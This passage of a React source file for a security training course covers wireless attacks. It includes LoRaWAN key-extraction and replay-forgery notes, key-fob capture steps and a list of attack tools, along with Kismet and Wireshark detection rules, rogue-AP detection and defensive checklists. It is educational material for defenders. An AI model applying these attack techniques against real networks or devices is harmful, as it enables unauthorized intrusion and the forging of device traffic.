# Many coordinators expose key via serial console or web UI`}</Pre>

        <H3>LoRaWAN Attacks</H3>
        <Pre label="// LORAWAN SECURITY ISSUES">{`# LoRaWAN uses two root keys:
# AppKey: used for OTAA join (device authentication)
# NwkKey: network session key derivation (LoRaWAN 1.1)

# LoRaWAN 1.0.x (most deployed): single AppKey
# Session keys derived: AppSKey (payload encrypt), NwkSKey (MIC)
# If AppKey is extracted from device: derive all session keys

# Key extraction from IoT device:
# UART console: many devices expose debug console
# JTAG/SWD: read firmware and extract keys from flash
# RF sniffing: capture OTAA join to get DevEUI, AppEUI, AppNonce
#   (AppKey still needed to decrypt MIC)

# Replay attack: LoRaWAN 1.0.x has weak replay protection
# Frame counter resets on device reboot
# With session keys: forge any uplink with valid MIC

# Tools for LoRaWAN analysis:
# ChirpStack: open source LoRaWAN network server
# LoRa Craft: LoRaWAN packet analysis
# gr-lora: GNU Radio LoRa receiver module`}</Pre>

        <H3>ADS-B and AIS Decoding</H3>
        <Pre label="// PASSIVE RF MONITORING">{`# ADS-B: aircraft transponders broadcast on 1090MHz
# Decode with RTL-SDR
sudo apt install dump1090-fa
dump1090-fa --interactive --net
# Web UI: http://localhost:8080

# AIS: ship transponders on 161.975MHz and 162.025MHz
sudo apt install rtl-ais
rtl_ais -d 0 -g 50

# Weather balloon radiosonde tracking (403MHz range)
sudo apt install radiosonde
# or use dxlAPRS/rs-sondemonitor

# Automotive key fobs (315MHz North America, 433MHz Europe)
# Capture with RTL-SDR + URH or GNU Radio
# Decode OOK/ASK signal
# Identify rolling code scheme (KeeLoq, AUT64, etc.)`}</Pre>
      </div>
    ),
  },
  {
    id: 'wl-09',
    title: 'Wireless Network Forensics & Detection',
    difficulty: 'INTERMEDIATE',
    readTime: '11 min',
    takeaways: [
      'Wireless IDS requires its own dedicated monitor-mode interface - passive monitoring does not interfere with client traffic',
      'PCI-DSS Requirement 11.2 mandates quarterly wireless scans and WIPS deployment in environments that use or allow WiFi',
      'Deauth attacks create a distinctive pattern: sudden multi-client disconnections followed by re-associations within seconds',
      'WPA3 migration and 802.11w enforcement are the highest-value defensive controls - they eliminate deauth and offline dictionary attacks',
      'Zero trust wireless treats the WiFi segment as untrusted - VPN or certificate-based segmentation even after 802.1X',
    ],
    content: (
      <div>
        <P>Wireless forensics and detection complete the security picture. Understanding how attacks appear in logs and packet captures helps both defenders build detection and attackers understand their footprint. This chapter covers wireless IDS/IPS, forensics methodology, and actionable defenses.</P>

        <H3>Kismet as Wireless IDS</H3>
        <Pre label="// KISMET WIDS CONFIGURATION">{`# Kismet provides alerting on wireless anomalies
# Configure alerts in kismet.conf or kismet_alerts.conf

# Key alert types:
# APSPOOF      - SSID spoofing detected (BSSID changed for known SSID)
# DEAUTHFLOOD  - Excessive deauth frames (deauth attack)
# DISCOFLOOD   - Excessive disassociation frames
# ADVCRYPTCHANGE - AP changed from encrypted to open (downgrade)
# CRYPTODROP   - AP dropped encryption
# CHANCHANGE   - AP changed channel (suspicious)
# BSSIDSPOOFED - Packet with spoofed BSSID

# Kismet alert output to syslog
kismet --daemonize --log-prefix /var/log/kismet/

# Real-time alert monitoring
tail -f /var/log/kismet/kismet.alert.log

# Send alerts to SIEM via syslog
# /etc/rsyslog.d/kismet.conf:
# if $programname == 'kismet' then @@SIEM_IP_HERE:514`}</Pre>

        <H3>Detecting Deauth Attacks in Wireshark</H3>
        <Pre label="// WIRESHARK 802.11 FILTERS">{`# Open pcap in Wireshark with capture from monitor-mode interface

# Filter: show only deauthentication frames
wlan.fc.type_subtype == 0x000C

# Filter: show deauth frames from specific source
wlan.fc.type_subtype == 0x000C && wlan.sa == BSSID_HERE

# Filter: show all management frames
wlan.fc.type == 0

# Filter: show 4-way handshake (EAPOL frames)
eapol

# Filter: show probe requests (client preferred networks)
wlan.fc.type_subtype == 0x0004

# Filter: show beacon frames
wlan.fc.type_subtype == 0x0008

# Filter: detect evil twin (same SSID, different BSSID)
wlan.ssid == "SSID_HERE"
# Then check if multiple BSSIDs appear

# Statistical view: select Statistics -> 802.11 Conversations
# Sort by frames to identify most active devices

# Detect handshake in pcap
# Edit -> Find -> Packet contains "EAPOL"
# Or use tshark:
tshark -r capture.pcap -Y eapol -T fields -e wlan.sa -e wlan.da`}</Pre>

        <H3>Rogue AP Detection</H3>
        <Pre label="// ROGUE AP DETECTION METHODS">{`# Method 1: SSID collision detection
# Monitor for beacons with known SSID but unknown BSSID
# Reference: maintain approved BSSID list
# Alert if SSID_HERE beacon seen from BSSID not in approved list

# Method 2: Signal strength inconsistency
# Legitimate APs have consistent signal from fixed location
# Rogue AP from laptop has variable signal
# Map RSSI over time for each BSSID

# Method 3: Client association tracking
# Monitor which BSSID each client MAC is associated with
# Alert if client jumps to unknown BSSID

# Method 4: Wired-side correlation
# Legitimate APs appear in switch port tables (CDP/LLDP)
# Rogue AP connected to an unauthorized port
# Cross-reference wireless BSSID with wired infrastructure

# Automated detection with Airgraph-ng
airodump-ng -w scan wlan0mon
airgraph-ng -i scan-01.csv -o topology.png -g CAPR  # Client-AP relationships
airgraph-ng -i scan-01.csv -o clients.png -g CPG    # Common probe graph`}</Pre>

        <H3>Wireless Audit Methodology</H3>
        <Table
          headers={['Phase', 'Activities', 'Tools']}
          rows={[
            ['Scoping', 'Define physical boundaries, authorized channels, client devices in scope', 'Legal agreement, network documentation'],
            ['Passive Collection', 'Monitor all channels, collect beacons, probe requests, data frames', 'Kismet, airodump-ng, Wireshark'],
            ['Active Reconnaissance', 'WPS status, enterprise EAP detection, client enumeration', 'wash, airodump-ng, eapmd5pass'],
            ['Authentication Testing', 'Handshake capture, PMKID, WPS, enterprise EAP attacks', 'hcxdumptool, reaver, eaphammer'],
            ['Post-association Testing', 'VLAN isolation, lateral movement, internet access', 'nmap, bettercap'],
            ['Reporting', 'Document findings, CVSS scores, remediation recommendations', 'Dradis, PlexTrac'],
          ]}
        />

        <H3>Wireless Site Survey</H3>
        <Pre label="// SITE SURVEY AND COVERAGE ANALYSIS">{`# inSSIDer (Windows/Mac): visual channel overlap analysis
# NetSpot: signal strength heat map generation
# Ekahau Site Survey: professional RF planning tool

# From Linux command line:
# Scan all visible APs with signal info
sudo iwlist wlan0 scan | grep -E 'ESSID|Signal|Channel|Encryption'

# Channel utilization analysis
sudo airodump-ng wlan0mon --channel-hopping
# Watch for crowded channels and interference

# Spectrum analysis for non-WiFi interference
# Using RTL-SDR + rtl_power:
rtl_power -f 2400M:2500M:1M -g 50 -i 10 spectrum.csv
# Then plot with heatmap.py

# PCI-DSS wireless requirements (Requirement 11.2):
# - Quarterly scans for unauthorized wireless APs
# - Alert on unauthorized AP detected
# - WIPS deployment or quarterly testing
# - Scan from inside (wired) and outside (wireless) perspective`}</Pre>

        <H3>Defensive Controls Priority</H3>
        <Pre label="// WIRELESS DEFENSE CHECKLIST">{`# Tier 1: Critical (implement immediately)
[x] WPA3-Personal with SAE (or WPA2 with strong unique passphrase 20+ chars)
[x] 802.11w Management Frame Protection - set to Required, not Optional
[x] Disable WPS completely on all APs
[x] WPA2-Enterprise with EAP-TLS (certificate auth) for corporate networks
[x] RADIUS server certificate validation enforced in client supplicant

# Tier 2: High (implement within 30 days)
[x] Wireless IDS/IPS (Kismet, Cisco wIPS, Aruba RAPIDscan)
[x] Client isolation (AP-to-AP traffic blocked on client VLAN)
[x] Separate SSID for guest/BYOD with network segmentation
[x] MAC address filtering as defense-in-depth (not primary control)
[x] Regular rogue AP scanning (weekly minimum)

# Tier 3: Advanced
[x] Network Access Control (802.1X) for wired ports post-WiFi association
[x] Device certificate enrollment via MDM (for EAP-TLS)
[x] Zero trust: treat WiFi segment as untrusted, enforce VPN
[x] Automatic VLAN assignment based on device posture
[x] RF spectrum analysis for jamming detection`}</Pre>

        <H3>Zero Trust Wireless Architecture</H3>
        <Pre label="// ZERO TRUST WIRELESS MODEL">{`# Traditional model:
# WiFi -> LAN -> Trust (bad assumption)

# Zero trust wireless:
# WiFi -> Firewall micro-segmentation -> Application-level auth

# Implementation:
# 1. 802.1X with EAP-TLS (device certificates)
#    Each device gets unique cert from internal CA
#    Lost/stolen device: revoke cert -> immediate access removal

# 2. Post-authentication segmentation
#    VLAN per user role (not per SSID)
#    Dynamic RADIUS VLAN assignment based on cert attributes

# 3. Application layer enforcement
#    Even authenticated WiFi clients cannot access resources
#    without additional application-layer authentication
#    mTLS between client and internal services

# 4. Continuous posture assessment
#    EDR agent checks -> NAC policy enforcement
#    Non-compliant device quarantined even if certs are valid

# 5. Wireless traffic monitoring
#    All WiFi traffic flows through inspection point
#    IDS/IPS inline on client VLAN uplinks`}</Pre>

        <Note type="tip">The most effective single defensive investment is migrating from WPA2-PSK to WPA2/WPA3-Enterprise with EAP-TLS. It eliminates offline dictionary attacks, provides per-user credential revocation, and generates detailed authentication logs for every connection attempt.</Note>
      </div>
    ),
  },
]

export default function WirelessAttacksPage() {
  return (
    <div>
      {/* Breadcrumb */}
      <div style={{ display: 'flex', alignItems: 'center', gap: '8px', marginBottom: '2rem', fontFamily: mono, fontSize: '0.7rem', color: '#5a6a3a' }}>
        <Link href="/" style={{ color: '#5a6a3a', textDecoration: 'none' }}>GHOSTNET</Link>
        <span>&#8250;</span>
        <span style={{ color: accent }}>MOD-12 // WIRELESS ATTACKS</span>
        <div style={{ marginLeft: 'auto', display: 'flex', gap: '8px' }}>
          <span style={{ padding: '3px 10px', background: 'rgba(170,255,0,0.08)', border: '1px solid rgba(170,255,0,0.3)', borderRadius: '3px', color: accent, fontSize: '8px', letterSpacing: '0.15em' }}>CONCEPT</span>
          <Link href="/modules/wireless-attacks/lab" style={{ textDecoration: 'none', padding: '3px 10px', background: 'rgba(170,255,0,0.1)', border: '1px solid rgba(170,255,0,0.5)', borderRadius: '3px', color: accent, fontSize: '8px', letterSpacing: '0.15em', fontWeight: 700 }}>LAB &#8594;</Link>
        </div>
      </div>

      {/* Module header */}
      <div style={{ marginBottom: '2.5rem' }}>
        <div style={{ fontFamily: mono, fontSize: '9px', color: '#5a6a3a', letterSpacing: '0.25em', marginBottom: '0.5rem' }}>MODULE 12 &middot; CONCEPT PAGE</div>
        <h1 style={{ fontFamily: mono, fontSize: '2rem', fontWeight: 700, color: accent, margin: '0.5rem 0', textShadow: '0 0 20px rgba(170,255,0,0.35)' }}>WIRELESS ATTACKS</h1>
        <p style={{ color: '#5a6a3a', fontFamily: mono, fontSize: '0.75rem' }}>
          802.11 standards &middot; WPA2/WPA3 cracking &middot; PMKID &middot; Evil Twin &middot; Enterprise 802.1X &middot; Bluetooth &middot; BLE &middot; RFID &middot; NFC &middot; SDR &middot; Zigbee &middot; Forensics
        </p>
      </div>

      {/* Module nav */}
      <div style={{ display: 'flex', gap: '8px', marginBottom: '2.5rem', flexWrap: 'wrap' }}>
        <Link href="/modules/red-team" style={{ fontFamily: mono, fontSize: '0.65rem', color: '#4a4a4a', textDecoration: 'none', padding: '4px 12px', border: '1px solid #1a1a1a', borderRadius: '3px' }}>
          &#8592; MOD-11 RED TEAM
        </Link>
        <Link href="/modules/mobile-security" style={{ fontFamily: mono, fontSize: '0.65rem', color: accent, textDecoration: 'none', padding: '4px 12px', border: '1px solid ' + accent + '44', borderRadius: '3px' }}>
          MOD-13 MOBILE SECURITY &#8594;
        </Link>
      </div>

      {/* Chapter count badge */}
      <div style={{ display: 'flex', gap: '12px', marginBottom: '2rem', flexWrap: 'wrap' }}>
        {[
          '9 chapters',
          '~117 min total',
          'WiFi + BT + RFID + SDR',
        ].map((item, i) => (
          <span key={i} style={{ fontFamily: mono, fontSize: '0.65rem', color: '#5a6a3a', padding: '3px 10px', border: '1px solid #1a2a00', borderRadius: '3px', background: 'rgba(170,255,0,0.03)' }}>
            {item}
          </span>
        ))}
      </div>

      {/* Chapter overview stats */}
      <div className="module-stat-grid">
        {[
          ['9', 'CHAPTERS'],
          ['~3.0hr', 'TOTAL READ'],
          ['INTERMEDIATE', 'DIFFICULTY'],
          ['MOD-12', 'IDENTIFIER'],
        ].map(([val, label], i) => (
          <div key={i} style={{ background: 'rgba(170,255,0,0.04)', border: '1px solid rgba(170,255,0,0.15)', borderRadius: '6px', padding: '1rem', textAlign: 'center' }}>
            <div style={{ fontFamily: mono, fontSize: '1.2rem', fontWeight: 700, color: accent }}>{val}</div>
            <div style={{ fontFamily: mono, fontSize: '0.6rem', color: '#3a4a1a', letterSpacing: '0.15em', marginTop: '2px' }}>{label}</div>
          </div>
        ))}
      </div>

      {/* ModuleCodex component */}
      <ModuleCodex
        moduleId="wireless-attacks"
        accent={accent}
        chapters={chapters}
      />

      {/* Bottom navigation */}
      <div style={{ marginTop: '4rem', paddingTop: '2rem', borderTop: '1px solid #1a2a00' }}>
        <div style={{ background: 'rgba(170,255,0,0.04)', border: '1px solid rgba(170,255,0,0.2)', borderRadius: '8px', padding: '2rem', textAlign: 'center', marginBottom: '1.5rem' }}>
          <div style={{ fontFamily: mono, fontSize: '0.65rem', color: '#3a4a1a', letterSpacing: '0.25em', marginBottom: '0.5rem' }}>READY TO PRACTICE?</div>
          <div style={{ fontFamily: mono, fontSize: '1rem', color: accent, marginBottom: '0.5rem', fontWeight: 600 }}>MOD-12 Interactive Lab</div>
          <div style={{ fontFamily: mono, fontSize: '0.75rem', color: '#3a4a1a', marginBottom: '1.5rem' }}>18 steps &middot; 455 XP &middot; Real commands &middot; Flag captures</div>
          <Link href="/modules/wireless-attacks/lab" style={{ textDecoration: 'none', fontFamily: mono, fontSize: '0.85rem', color: accent, padding: '12px 32px', border: '1px solid rgba(170,255,0,0.6)', borderRadius: '6px', background: 'rgba(170,255,0,0.1)', fontWeight: 700, letterSpacing: '0.12em', boxShadow: '0 0 20px rgba(170,255,0,0.15)', display: 'inline-block' }}>
            LAUNCH LAB &#8594;
          </Link>
        </div>
        <div style={{ display: 'flex', justifyContent: 'space-between' }}>
          <Link href="/modules/red-team" style={{ textDecoration: 'none', fontFamily: mono, fontSize: '0.75rem', color: '#3a4a1a' }}>&#8592; MOD-11: RED TEAM</Link>
          <Link href="/modules/mobile-security" style={{ textDecoration: 'none', fontFamily: mono, fontSize: '0.75rem', color: '#3a4a1a' }}>MOD-13: MOBILE SECURITY &#8594;</Link>
        </div>
      </div>
    </div>
  )
}
